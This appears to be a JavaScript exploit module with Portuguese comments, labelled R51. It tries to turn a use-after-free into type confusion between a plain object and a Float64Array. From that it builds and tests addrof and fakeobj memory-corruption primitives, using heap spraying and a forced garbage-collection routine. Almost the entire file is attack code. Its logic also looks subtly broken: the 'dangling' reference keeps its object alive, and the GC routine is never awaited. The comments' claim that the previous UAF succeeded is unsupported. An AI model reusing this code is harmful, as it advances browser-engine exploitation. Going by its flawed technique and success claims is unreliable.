// js/script3/testArrayBufferVictimCrash.mjs (R51 - Construção de Primitivas Estáveis)
// =======================================================================================
// ESTRATÉGIA R51:
// O UAF R50 foi um sucesso. Agora, usamos a mesma base para um fim mais útil.
// 1. Usamos o UAF para confundir um objeto genérico com um Float64Array.
// 2. A sobreposição de memória entre os dois tipos nos permite criar addrof e fakeobj.
// 3. VALIDAMOS as primitivas para garantir que estão funcionando antes de prosseguir.
// =======================================================================================

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64 } from '../utils.mjs';

export const FNAME_MODULE = "UAF_Primitives_Builder_R51";

// Função auxiliar para converter de e para double
const ftoi = (val) => {
    const buf = new ArrayBuffer(8);
    (new Float64Array(buf))[0] = val;
    const ints = new Uint32Array(buf);
    return new AdvancedInt64(ints[0], ints[1]);
};

const itof = (val) => {
    const buf = new ArrayBuffer(8);
    const ints = new Uint32Array(buf);
    ints[0] = val.low();
    ints[1] = val.high();
    return (new Float64Array(buf))[0];
};

// =======================================================================================
// FUNÇÃO ORQUESTRADORA PRINCIPAL (R51)
// =======================================================================================
export async function runStableUAFPrimitives_R51() {
    logS3(`--- Iniciando ${FNAME_MODULE}: Construção e Validação de Primitivas ---`, "test");
    
    let final_result = { success: false, message: "Falha na criação das primitivas." };

    try {
        // --- FASE 1: Estabelecer a Confusão de Tipos ---
        logS3("--- FASE 1: Estabelecendo a Confusão de Tipos (Objeto vs Float64Array) ---", "subtest");
        let dangling_ref = createDanglingRefToFloat64Array();
        if (typeof dangling_ref.a !== 'number') { // Validação do UAF
            throw new Error("Falha no UAF. A propriedade não foi sobrescrita por um double.");
        }
        logS3("    Confusão de tipos estabelecida com sucesso!", "good");

        // --- FASE 2: Construir as Primitivas ---
        logS3("--- FASE 2: Construindo as primitivas addrof e fakeobj ---", "subtest");

        let holder = {obj: null}; // Objeto auxiliar
        
        const addrof = (obj) => {
            holder.obj = obj;
            // A propriedade 'a' do nosso objeto original sobrepõe o butterfly do Float64Array.
            // A propriedade 'b' sobrepõe o primeiro elemento.
            // Escrevemos o objeto que queremos vazar em 'a' (que é o butterfly).
            dangling_ref.a = holder; 
            // Agora, ler o primeiro elemento do Float64Array ('b') nos dará o endereço de 'holder.obj'.
            return ftoi(dangling_ref.b);
        };
        
        const fakeobj = (addr) => {
            // Escrevemos o endereço falso no primeiro elemento do Float64Array ('b').
            dangling_ref.b = itof(addr);
            // Agora, ler 'a' (que é o butterfly) nos dará um objeto que aponta para o endereço falso.
            return dangling_ref.a.obj;
        };

        logS3("    Primitivas `addrof` e `fakeobj` construídas.", "vuln");

        // --- FASE 3: Validação (Prova de Vida) ---
        logS3("--- FASE 3: Validando as primitivas (Prova de Vida) ---", "subtest");
        const test_obj = { marker1: 0xCAFEF00D, marker2: 0x1337BEEF };
        
        const test_addr = addrof(test_obj);
        logS3(`    Prova de Vida (addrof): Endereço do objeto de teste -> ${test_addr.toString(true)}`, "leak");
        if(test_addr.low() === 0) throw new Error("addrof retornou um endereço nulo.");

        const fake_test_obj = fakeobj(test_addr);
        logS3("    Prova de Vida (fakeobj): Objeto falso criado no endereço vazado.", "info");

        if (fake_test_obj.marker1 === 0xCAFEF00D && fake_test_obj.marker2 === 0x1337BEEF) {
            final_result = { success: true, message: "SUCESSO! Primitivas addrof e fakeobj estáveis e validadas." };
            logS3(`    ${final_result.message}`, "vuln");
        } else {
            throw new Error("Validação falhou. O objeto falso não corresponde ao original.");
        }
        
    } catch (e) {
        final_result.message = `Exceção na cadeia de primitivas: ${e.message}`;
        logS3(final_result.message, "critical");
    }

    logS3(`--- ${FNAME_MODULE} Concluído ---`, "test");
    return {
        errorOccurred: final_result.success ? null : final_result.message,
        final_result
    };
}

// --- Funções Auxiliares UAF (Adaptadas para Float64Array) ---
async function triggerGC() {
    try {
        const gc_trigger_arr = [];
        for (let i = 0; i < 500; i++) {
            gc_trigger_arr.push(new ArrayBuffer(1024 * 128));
        }
    } catch (e) { /* ignora */ }
    await PAUSE_S3(500);
}

function createDanglingRefToFloat64Array() {
    // 1. Cria o ponteiro pendurado para um objeto simples
    let dangling_ref = null;
    function createScope() {
        const victim = { a: 0.1, b: 0.2 };
        dangling_ref = victim;
        for(let i=0; i<100; i++) { victim.a += 0.01; } // Uso para evitar otimizações
    }
    createScope();

    // 2. Força a coleta de lixo
    triggerGC();

    // 3. Reclama a memória com um Float64Array
    const spray_arrays = [];
    for (let i = 0; i < 512; i++) {
        spray_arrays.push(new Float64Array(2));
    }

    return dangling_ref;
}
